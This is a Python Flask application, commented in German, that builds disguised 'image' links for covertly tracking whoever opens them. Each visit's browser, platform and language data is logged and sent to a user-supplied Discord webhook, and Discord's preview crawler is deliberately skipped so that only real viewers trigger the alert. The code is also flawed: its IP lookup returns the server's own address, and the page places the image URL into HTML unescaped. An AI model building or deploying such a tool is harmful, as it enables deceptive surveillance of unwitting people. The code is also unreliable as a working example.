from flask import Flask, request, jsonify, render_template
import os
import json
import secrets
from datetime import datetime
import urllib.request

app = Flask(__name__)

# Erstelle notwendige Verzeichnisse
os.makedirs('tracking_data', exist_ok=True)
os.makedirs('templates', exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_url = data.get('image_url')
        webhook_url = data.get('webhook_url')
        
        if not image_url or not webhook_url:
            return jsonify({'error': 'Bild-URL und Webhook-URL sind erforderlich'}), 400
        
        # Generiere einzigartige Tracking-ID
        tracking_id = secrets.token_urlsafe(16)
        
        # Speichere Tracking-Daten
        tracking_data = {
            'id': tracking_id,
            'image_url': image_url,
            'webhook_url': webhook_url,
            'created_at': datetime.now().isoformat(),
            'visits': []
        }
        
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        with open(tracking_file, 'w', encoding='utf-8') as f:
            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
        
        # Generiere Tracking-URL (für Railway)
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?track={tracking_id}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    tracking_id = request.args.get('track')
    print(f"🔍 DEBUG: Track-Route aufgerufen mit ID: {tracking_id}")
    
    if not tracking_id:
        print("❌ DEBUG: Kein Tracking-Parameter gefunden")
        return "Tracking-Parameter fehlt", 400
    
    try:
        # Lade Tracking-Daten
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        print(f"📁 DEBUG: Tracking-Datei: {tracking_file}")
        
        if not os.path.exists(tracking_file):
            print(f"❌ DEBUG: Tracking-Datei nicht gefunden")
            return "Tracking-Link nicht gefunden", 404
        
        with open(tracking_file, 'r', encoding='utf-8') as f:
            tracking_data = json.load(f)
        
        print(f"✅ DEBUG: Tracking-Daten geladen: {tracking_data}")
        
        # Sammle Besucher-Informationen mit direktem externen IP-Service
        def get_client_ip():
            try:
                # Nutze myip.com API für zuverlässige IP-Erkennung
                with urllib.request.urlopen('https://api.myip.com', timeout=5) as response:
                    ip = response.read().decode().strip()
                    return ip if ip else 'Unbekannt'
            except:
                try:
                    # Fallback zu ipify.org
                    with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5) as response:
                        data = json.loads(response.read().decode())
                        return data.get('ip', 'Unbekannt')
                except:
                    return 'Unbekannt'
        
        visitor_info = {
            'ip': get_client_ip(),
            'user_agent': request.headers.get('User-Agent', 'Unbekannt'),
            'referer': request.headers.get('Referer', 'Direkter Zugriff'),
            'timestamp': datetime.now().isoformat(),
            'language': request.headers.get('Accept-Language', 'Unbekannt'),
            'platform': request.user_agent.platform if hasattr(request.user_agent, 'platform') else 'Unbekannt',
            'browser': request.user_agent.browser if hasattr(request.user_agent, 'browser') else 'Unbekannt'
        }
        
        print(f"🌐 DEBUG: Besucher-Info: {visitor_info}")
        
        # Füge Besuch hinzu
        tracking_data['visits'].append(visitor_info)
        
        # Speichere aktualisierte Daten
        with open(tracking_file, 'w', encoding='utf-8') as f:
            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
        
        # Sende Discord-Benachrichtigung (nur wenn nicht von Discord selbst besucht)
        user_agent = request.headers.get('User-Agent', '').lower()
        print(f"🤖 DEBUG: User-Agent: {user_agent}")
        
        if 'discord' not in user_agent:
            print("📤 DEBUG: Sende Discord-Benachrichtigung...")
            try:
                send_discord_notification(tracking_data['webhook_url'], visitor_info, tracking_data)
                print("✅ DEBUG: Discord-Benachrichtigung gesendet")
            except Exception as e:
                print(f"❌ DEBUG: Fehler beim Senden der Discord-Benachrichtigung: {e}")
        else:
            print("🚫 DEBUG: Discord-Besuch erkannt - keine Benachrichtigung gesendet")
        
        # Zeige HTML-Seite mit Open Graph Meta-Tags (ohne Pillow)
        image_url = tracking_data['image_url']
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Bild">
    <meta property="og:description" content="Klicke hier um das Bild zu sehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="IP Tracker">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Bild">
    <meta name="twitter:description" content="Klicke hier um das Bild zu sehen">
    <meta name="twitter:image" content="{image_url}">
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }}
        .container {{
            text-align: center;
            max-width: 100%;
        }}
        img {{ 
            max-width: 100%; 
            height: auto; 
            max-height: 90vh;
            object-fit: contain;
        }}
        .loading {{
            color: white;
            font-family: Arial, sans-serif;
            font-size: 18px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loading">Bild wird geladen...</div>
        <img src="{image_url}" alt="Bild" onload="document.querySelector('.loading').style.display='none'">
    </div>
</body>
</html>
        """
        
    except Exception as e:
        print(f"Fehler bei der Verarbeitung: {e}")
        return f"Fehler: {str(e)}", 500

def send_discord_notification(webhook_url, visitor_info, tracking_data):
    """Sendet eine Benachrichtigung an Discord"""
    try:
        import urllib.request
        import json
        
        # Discord Embed Nachricht
        embed = {
            "title": "🔍 Bild wurde angesehen!",
            "description": f"Jemand hat dein Tracking-Bild angesehen",
            "color": 5814783,  # Blau
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"```\n{visitor_info['ip']}\n```",
                    "inline": True
                },
                {
                    "name": "🕐 Uhrzeit",
                    "value": f"```\n{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n```",
                    "inline": True
                },
                {
                    "name": "🌍 Land/Region",
                    "value": f"```\n{visitor_info['language']}\n```",
                    "inline": True
                },
                {
                    "name": "🖥️ Gerät",
                    "value": f"```\n{visitor_info['platform']}\n```",
                    "inline": True
                },
                {
                    "name": "🌐 Browser",
                    "value": f"```\n{visitor_info['browser']}\n```",
                    "inline": True
                },
                {
                    "name": "🔗 Tracking-Link",
                    "value": f"[Hier klicken]({request.url})",
                    "inline": False
                }
            ],
            "footer": {
                "text": "IP Tracker - Automatische Benachrichtigung"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        data = {
            "embeds": [embed]
        }
        
        # Sende an Discord
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            return response.read().decode()
            
    except Exception as e:
        print(f"Fehler beim Senden an Discord: {e}")
        raise

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/test-webhook')
def test_webhook():
    """Test-Endpunkt für Webhook"""
    try:
        test_data = {
            'id': 'test-123',
            'image_url': 'https://example.com/test.jpg',
            'webhook_url': 'https://discord.com/api/webhooks/test'
        }
        
        visitor_info = {
            'ip': '1.2.3.4',
            'user_agent': 'Test-Browser',
            'referer': 'Test-Referer',
            'timestamp': datetime.now().isoformat(),
            'language': 'de-DE',
            'platform': 'Test-OS',
            'browser': 'Test-Browser'
        }
        
        print("🧪 DEBUG: Test-Webhook wird gesendet...")
        send_discord_notification(test_data['webhook_url'], visitor_info, test_data)
        print("✅ DEBUG: Test-Webhook gesendet")
        
        return jsonify({'status': 'test-sent', 'message': 'Test-Webhook wurde gesendet'})
    except Exception as e:
        print(f"❌ DEBUG: Test-Webhook Fehler: {e}")
        return jsonify({'status': 'test-failed', 'error': str(e)}), 500

@app.route('/stats/<tracking_id>')
def view_stats(tracking_id):
    """Zeigt Statistiken für einen Tracking-Link"""
    try:
        tracking_file = os.path.join('tracking_data', f'{tracking_id}.json')
        
        if not os.path.exists(tracking_file):
            return jsonify({'error': 'Tracking-Link nicht gefunden'}), 404
        
        with open(tracking_file, 'r', encoding='utf-8') as f:
            tracking_data = json.load(f)
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'image_url': tracking_data['image_url'],
            'created_at': tracking_data['created_at'],
            'total_visits': len(tracking_data['visits']),
            'visits': tracking_data['visits']
        })
        
    except Exception as e:
        return jsonify({'error': f'Fehler: {str(e)}'}), 500

# Für Railway
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
